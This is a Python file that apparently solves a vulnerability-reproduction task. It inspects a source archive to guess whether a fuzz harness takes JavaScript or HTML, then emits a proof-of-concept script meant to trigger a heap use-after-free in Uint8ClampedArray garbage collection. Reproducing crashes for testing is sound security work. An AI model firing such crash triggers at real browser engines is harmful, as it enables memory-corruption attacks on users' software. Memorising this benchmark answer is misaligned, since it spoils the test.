import io
import os
import tarfile
from typing import Optional


class Solution:
    def _detect_format(self, src_path: str) -> str:
        # Returns "js" or "html"
        try:
            if not os.path.isfile(src_path):
                return "js"
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                # Prefer scanning likely harness/fuzzer entrypoints first
                def score_name(n: str) -> int:
                    nl = n.lower()
                    s = 0
                    if any(k in nl for k in ("fuzz", "harness", "driver", "runner", "entry", "main")):
                        s += 10
                    if nl.endswith((".cpp", ".cc", ".c", ".hpp", ".h", "cmakelists.txt")):
                        s += 3
                    if any(k in nl for k in ("test", "tests")):
                        s += 1
                    return -s

                candidates = sorted(
                    (m for m in members if m.isfile() and m.size > 0 and m.size <= 250_000),
                    key=lambda m: (score_name(m.name), m.size),
                )

                def read_member(m) -> Optional[bytes]:
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            return None
                        data = f.read(250_000)
                        return data
                    except Exception:
                        return None

                # Quick name-based heuristics
                names_concat = "\n".join(m.name for m in members[:2000]).lower()
                name_hints_web = any(x in names_concat for x in ("libweb", "webcontent", "html", "dom", "canvas"))
                name_hints_js = any(x in names_concat for x in ("libjs", "js.cpp", "interpreter", "bytecode"))

                web_votes = 1 if name_hints_web else 0
                js_votes = 1 if name_hints_js else 0

                for m in candidates[:80]:
                    data = read_member(m)
                    if not data:
                        continue
                    s = data.decode("utf-8", "ignore")
                    sl = s.lower()

                    # Strong indicators of HTML/document loading harness
                    if ("libweb" in sl or "webcontent" in sl) and (
                        "html" in sl
                        or "document" in sl
                        or "dom" in sl
                        or "page" in sl
                        or "browsing_context" in sl
                        or "parse_html" in sl
                        or "load_html" in sl
                    ):
                        web_votes += 3
                    if ("html::" in s) or ("LibWeb" in s):
                        web_votes += 1
                    if ("JS::" in s) or ("LibJS" in s) or ("interpreter" in sl and "js" in sl):
                        js_votes += 1
                    if ("parse_program" in sl) or ("parse_script" in sl) or ("bytecode" in sl):
                        js_votes += 2

                return "html" if web_votes > js_votes + 2 else "js"
        except Exception:
            return "js"

    def _js_poc(self) -> str:
        # Designed to trigger heap-use-after-free if Uint8ClampedArray fails to trace its ArrayBuffer during GC.
        return r"""
(function(){
  function tryGC() {
    var fns = [globalThis.gc, globalThis.collectGarbage, globalThis.collect_garbage, globalThis.GC];
    for (var i = 0; i < fns.length; i++) {
      if (typeof fns[i] === "function") {
        for (var j = 0; j < 8; j++) fns[i]();
        return;
      }
    }
    // Fallback: memory pressure to provoke GC
    for (var round = 0; round < 24; round++) {
      var t = [];
      for (var k = 0; k < 256; k++) t.push(new ArrayBuffer(0x4000));
      t = null;
    }
  }

  function trigger() {
    var a = new Uint8ClampedArray(0x100000);
    tryGC();
    a[0] = 7;
    a[0x80000] = 9;
    var v = a[0] + a[0x80000];
    if (v !== 16) { /* keep side effects */ globalThis.__poc = v; }
  }

  trigger();
})();
""".lstrip()

    def _html_poc(self) -> str:
        # Wrap the same JS payload in HTML in case the harness loads HTML and executes scripts.
        js = self._js_poc()
        return "<!doctype html><meta charset=utf-8><script>\n" + js + "\n</script>\n"

    def solve(self, src_path: str) -> bytes:
        fmt = self._detect_format(src_path)
        payload = self._html_poc() if fmt == "html" else self._js_poc()
        return payload.encode("utf-8")